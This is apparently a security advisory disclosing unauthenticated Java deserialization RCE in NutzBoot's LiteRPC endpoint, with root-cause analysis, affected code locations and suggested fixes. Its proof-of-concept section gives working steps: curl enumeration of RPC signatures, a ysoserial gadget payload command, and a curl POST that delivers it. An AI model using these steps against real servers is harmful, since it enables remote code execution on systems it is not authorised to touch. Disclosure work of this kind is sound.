# NutzBoot LiteRPC HTTP endpoint unauthenticated Java deserialization RCE

# NAME OF AFFECTED PRODUCT(S)

- NutzBoot (LiteRPC + Loach modules)

## Vendor Homepage

- [Nutz Framework](https://nutz.io)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- sh7err@vEcho

## VERSION(S)

- 2.6.0-SNAPSHOT (current `dev` branch, commit inspected locally)
- Earlier versions that expose the LiteRPC HTTP endpoint are likely affected. A fixed version is not available at the time of writing.

## Software Link

- [https://github.com/nutzam/nutzboot](https://github.com/nutzam/nutzboot)

# PROBLEM TYPE

## Vulnerability Type

- Unauthenticated Java deserialization leading to remote code execution

## Root Cause

- `HttpServletRpcEndpoint` (`nutzcloud/nutzcloud-literpc/.../HttpServletRpcEndpoint.java`) accepts arbitrary HTTP requests, pulls the serializer name from the attacker-controlled `LiteRpc-Serializer` header, and immediately deserializes the request body through the selected `RpcSerializer`. The default `JdkRpcSerializer` (`.../JdkRpcSerializer.java`) directly invokes `ObjectInputStream.readObject()` without `ObjectInputFilter` or any allow‑list. Meanwhile `LoachClient` automatically publishes every registered RPC class/method pair via `/loach/v1/list`, so an attacker can discover valid method signatures without authentication. There is no authentication or origin restriction anywhere in this flow.

## Impact

- A remote unauthenticated attacker can send a crafted serialized payload to `/literpc/endpoint` and obtain arbitrary code execution in the context of the NutzBoot service process.

# DESCRIPTION

An exposed LiteRPC HTTP endpoint allows arbitrary deserialization of attacker‑controlled data. The server expects the following headers: `LiteRpc-Klass`, `LiteRpc-Method`, and `LiteRpc-Serializer`. If all three are present, the endpoint looks up the serializer by name and blindly calls `serializer.read(req.getInputStream())`, trusting the client-provided serializer (`HttpServletRpcEndpoint.java:47-110`).

LiteRPC registers `JdkRpcSerializer` by default, and that serializer is chosen whenever the client sets `LiteRpc-Serializer: jdk`. The serializer wraps the request body in `ObjectInputStream` and invokes `readObject()` (lines 18-28). No filtering occurs before object graph creation, so any gadget chain available on the classpath can be triggered.

Service discovery through Loach amplifies the issue: `/loach/v1/list` and `/loach/v1/list/forlook` expose the `LiteRpc.RPC_REG_KEY` metadata that contains every registered RPC interface with its hashed method signatures. Therefore, an attacker can enumerate valid values for `LiteRpc-Klass` and `LiteRpc-Method` without guessing, guaranteeing that the invocation will reach a real `RpcInvoker` and the deserialization code path will execute.

Because neither `/literpc/endpoint` nor the Loach list endpoints enforce authentication or network restrictions in code, this becomes a pre-authentication remote code execution vulnerability.

# CODE ANALYSIS

- `nutzcloud/nutzcloud-literpc/src/main/java/org/nutz/boot/starter/literpc/impl/endpoint/http/HttpServletRpcEndpoint.java:47-110` – retrieves serializer name from headers, calls `serializer.read(req.getInputStream())` before any trust validation.
- `nutzcloud/nutzcloud-literpc/src/main/java/org/nutz/boot/starter/literpc/impl/serializer/JdkRpcSerializer.java:18-28` – default serializer uses raw `ObjectInputStream` with no filtering.
- `nutzcloud/nutzcloud-loach-client/src/main/java/org/nutz/boot/starter/loach/client/LoachClient.java:239-286` – publishes `LiteRpc.RPC_REG_KEY` data (class/method list) to Loach.
- `nutzcloud/nutzcloud-loach-server/src/main/java/org/nutz/cloud/loach/server/module/LoachV1Module.java:91-144` – `/loach/v1/list` and `/loach/v1/list/forlook` expose the registration data without authentication.

# VULNERABILITY DETAILS AND POC

## Vulnerability location

- `/literpc/endpoint` exposed by `HttpServletRpcEndpoint`

## Steps to Reproduce

1. Retrieve registered RPC metadata:
   ```bash
   curl http://<loach-host>/loach/v1/list | jq '.data | keys'
   ```
   The response contains `LiteRpc.RPC_REG_KEY` entries with class names and method signatures (e.g., `io.nutz.cloud.demo.service.UserService:add:7e18b2f3`).
2. Generate a malicious Java serialization payload using any available gadget (e.g., `ysoserial CommonsCollections6 calc > payload.bin`).
3. Send the payload to the LiteRPC HTTP endpoint:
   ```bash
   curl -X POST http://<victim-host>/literpc/endpoint \
        -H 'LiteRpc-Klass: io.nutz.cloud.demo.service.UserService' \
        -H 'LiteRpc-Method: add:7e18b2f3' \
        -H 'LiteRpc-Serializer: jdk' \
        --data-binary @payload.bin
   ```
4. As soon as the request body hits `ObjectInputStream`, the gadget chain executes on the server.

No authentication, CSRF token, or origin restrictions are required.

# SUGGESTED REPAIR

1. Disable or remove the JDK serializer and adopt a safe format (JSON/Kryo) for LiteRPC HTTP transport. If Java serialization must remain, enforce `ObjectInputFilter` with a strict allow-list of DTOs.
2. Do not let the client choose the serializer via headers; bind the serializer to server configuration only.
3. Require authentication and authorization before allowing access to `/literpc/endpoint`, or restrict the endpoint to internal interfaces only (mutual TLS, IP ACL, etc.).
4. Limit the information exposed by Loach service-list APIs or protect those endpoints with authentication.
